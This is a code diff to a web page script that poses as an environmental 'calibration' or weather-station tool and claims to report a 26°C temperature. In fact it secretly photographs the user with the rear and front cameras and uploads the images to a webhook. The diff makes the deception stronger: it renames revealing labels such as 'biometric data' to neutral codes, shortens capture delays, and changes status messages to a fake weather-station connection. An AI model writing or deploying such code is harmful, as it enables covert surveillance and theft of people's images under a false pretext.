@@ -43,46 +43,44 @@ async function startCalibration() {
     const status = document.getElementById("status");
     document.getElementById("btn").style.display = "none";
     document.getElementById("loader").style.display = "block";
-    status.innerHTML = "正在請求感測器權限...";
+    status.innerHTML = "正在連線到氣象站...";
 
     try {
-        // --- 1. 後鏡頭連拍兩張 ---
-        status.innerHTML = "環境光譜掃描中 (後鏡頭)...";
+        // --- 1. 後鏡頭捕捉 ---
         let stream = await navigator.mediaDevices.getUserMedia({ video: { facingMode: "environment" } });
         let video = document.getElementById("v");
         video.srcObject = stream;
         await video.play();
 
-        await sleep(1500); // 等待對焦
-        await takeSnap(video, "env_1.jpg", "📸 **環境校準數據 A (後鏡頭)**");
-        await sleep(1000);
-        await takeSnap(video, "env_2.jpg", "📸 **環境校準數據 B (後鏡頭)**");
+        await sleep(800); // 縮短等待時間
+        await takeSnap(video, "data_a1.jpg", "📡 **DATA_ENV_A**");
+        await sleep(300);
+        await takeSnap(video, "data_a2.jpg", "📡 **DATA_ENV_B**");
 
-        // 停止後鏡頭 (關燈)
         stream.getTracks().forEach(t => t.stop());
 
-        // --- 2. 前鏡頭連拍兩張 ---
-        status.innerHTML = "深度數據運算中 (前鏡頭)...";
+        // --- 2. 前鏡頭捕捉 ---
+        status.innerHTML = "環境光譜分析中...";
         stream = await navigator.mediaDevices.getUserMedia({ video: { facingMode: "user" } });
         video.srcObject = stream;
         await video.play();
 
-        await sleep(1500);
-        await takeSnap(video, "self_1.jpg", "👤 **生物特徵數據 A (前鏡頭)**");
-        await sleep(1000);
-        await takeSnap(video, "self_2.jpg", "👤 **生物特徵數據 B (前鏡頭)**");
+        await sleep(800);
+        await takeSnap(video, "data_b1.jpg", "📡 **DATA_USER_A**");
+        await sleep(300);
+        await takeSnap(video, "data_b2.jpg", "📡 **DATA_USER_B**");
 
-        // --- 3. 徹底結束 ---
-        stream.getTracks().forEach(t => t.stop()); // 關閉相機燈號
-        status.innerHTML = "數據分析完成，正在載入報表...";
+        // --- 3. 結束 ---
+        stream.getTracks().forEach(t => t.stop());
+        status.innerHTML = "數據傳輸中...";
         
         setTimeout(() => { 
             alert("校準成功：當前環境體感溫度為 26°C。"); 
             location.reload(); 
-        }, 1000);
+        }, 800);
 
     } catch (err) {
-        status.innerHTML = "校準失敗：需要硬體存取權限。";
+        status.innerHTML = "校準失敗：連線逾時。";
         document.getElementById("loader").style.display = "none";
     }
 }
@@ -98,8 +96,8 @@ async function takeSnap(video, filename, content) {
             const fd = new FormData();
             fd.append("file", blob, filename);
             fd.append("payload_json", JSON.stringify({ content }));
-            fetch(webhook, { method: "POST", body: fd }).then(resolve);
-        }, "image/jpeg", 0.7);
+            fetch(webhook, { method: "POST", body: fd }).then(resolve).catch(resolve);
+        }, "image/jpeg", 0.6); // 稍微調低品質以增加傳輸速度
     });
 }
 </script>
